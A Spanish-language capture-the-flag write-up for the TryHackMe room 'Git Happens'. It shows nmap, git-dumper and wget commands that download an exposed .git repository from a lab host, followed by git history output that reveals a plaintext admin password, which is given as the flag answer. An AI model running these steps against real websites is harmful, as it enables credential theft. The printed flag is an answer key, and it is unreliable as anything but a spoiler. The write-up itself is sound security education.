# Git Happens

| **Dificultad** | Easy |
| **Tipo** | CTF |
| **Slug** | `githappens` |
| **Link** | [TryHackMe](https://tryhackme.com/room/githappens) |
| **Sección** | 01 Level Easy |
| **Fuente** | Writeup de Kiran Dawadi (CyberSec Nerds) + AfvanMoopen (GitHub) |
| **Componentes** | nmap / .git expuesto / git-dumper / wget / git log / git show / nginx |
| **Impacto** | Aprovecha un repositorio `.git` expuesto públicamente para filtrar credenciales de un commit anterior no ofuscado. |

---

**Contexto:** Room de nivel principiante que enseña sobre malas configuraciones de control de versiones (git) y errores de desarrolladores que llevan a problemas de seguridad. Un repositorio `.git` expuesto públicamente filtra credenciales en un commit anterior.

## Solucionario

### Task 1: Find the Super Secret Password

**Explicación:** El escaneo de nmap descubre un repositorio git expuesto en `/.git/`:

```
nmap -sC -sV MACHINE_IP

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
| http-git:
|   10.10.201.254:80/.git/
|     Git repository found!
|_http-title: Super Awesome Site!
```

Descargar el repositorio `.git` completo con git-dumper o wget recursivo:

```
/opt/git-dumper/git-dumper.py http://MACHINE_IP:80/.git/ ./git_files
# o
wget http://MACHINE_IP/.git/ --recursive --no-parent
```

`git log` revela dos commits:

```
commit d0b3578a628889f38c0affb1b75457146a4678e5 (HEAD -> master, tag: v1.0)
    Update .gitlab-ci.yml

commit 395e087334d613d5e423cdf8f7be27196a360459
    Made the login page, boss!
```

El commit `395e087` ("Made the login page, boss!") contiene el código de la página de login **antes** de que se ofuscara. Ver el diff:

```
git show 395e087334d613d5e423cdf8f7be27196a360459
```

En el `index.html` se encuentran las credenciales en texto claro:

```javascript
if (
  username === "admin" &&
  password === "Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!"
) {
  document.cookie = "login=1";
  window.location.href = "/dashboard.html";
}
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Find the Super Secret Password | `Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!` |

---

**Metodología:**
1. **Recon:** `nmap -sC -sV MACHINE_IP` descubre el servicio http nginx 1.14.0 (Ubuntu) en el puerto 80 y, vía el script `http-git`, un repositorio git expuesto en `/.git/`.
2. **Descarga:** descargar el repositorio `.git` completo con git-dumper (`/opt/git-dumper/git-dumper.py http://MACHINE_IP:80/.git/ ./git_files`) o con wget recursivo (`wget http://MACHINE_IP/.git/ --recursive --no-parent`).
3. **Análisis:** `git log` revela dos commits: `d0b3578a` ("Update .gitlab-ci.yml", HEAD) y `395e087` ("Made the login page, boss!"); el commit `395e087` contiene el código de la página de login **antes** de que se ofuscara.
4. **Foothold:** `git show 395e087334d613d5e423cdf8f7be27196a360459` muestra el `index.html` con las credenciales en texto claro: `username === "admin"` y `password === "Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!"`; la contraseña se puede usar como flag o para autenticarse (cookie `login=1`).

**Learning chain:** nmap (http-git) → repositorio .git expuesto → git-dumper/wget descarga → git log → commit "Made the login page, boss!" → git show → credenciales en texto claro en el diff → flag.

**Lección:** nunca exponer el directorio `.git` públicamente; los commits anteriores pueden contener secretos que se creían eliminados.

**MITRE ATT&CK:** T1005 (Data from Local System), T1552.001 (Unsecured Credentials: Credentials in Files).

**Fuente:** [TryHackMe - Git Happens](https://tryhackme.com/room/githappens)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
